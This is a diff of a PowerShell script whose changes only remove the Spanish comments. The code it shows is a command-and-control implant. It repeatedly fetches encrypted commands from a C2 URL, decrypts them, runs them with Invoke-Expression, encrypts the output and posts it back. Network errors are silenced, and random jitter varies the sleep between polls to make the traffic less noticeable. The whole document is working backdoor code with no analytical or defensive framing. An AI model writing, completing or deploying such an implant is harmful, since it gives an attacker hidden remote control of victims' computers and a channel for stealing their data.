@@ -30,28 +30,18 @@ function Encrypt-Result ($plainText) {
 
 while($true) {
     try {
-        # 1. Pedir tarea (llega cifrada)
         $response = Invoke-RestMethod -Uri "$C2_URL/tasks" -Method Get -ErrorAction Stop
-
-        # 2. Descifrar la tarea
         $cmd = Decrypt-Command $response
 
         if ($cmd -ne "IDLE") {
-            # 3. Ejecutar comando
             $result = Invoke-Expression $cmd | Out-String
-
-            # Control por si el comando no devuelve nada (ej: mkdir)
             if ([string]::IsNullOrWhiteSpace($result)) { $result = "[Comando ejecutado con éxito, sin salida de texto]" }
-
-            # 4. Cifrar el resultado y enviarlo de vuelta
             $encryptedResult = Encrypt-Result $result
             Invoke-RestMethod -Uri "$C2_URL/results" -Method Post -Body $encryptedResult -ContentType "text/plain" -ErrorAction Stop
         }
     } catch {
-        # Silencio en caso de error de red
+        # Silencio 
     }
-
-    # JITTER: Variación del tiempo de espera
     $RandomJitter = Get-Random -Minimum -1 -Maximum 2
     $SleepTime = 5 + $RandomJitter
     Start-Sleep -Seconds $SleepTime
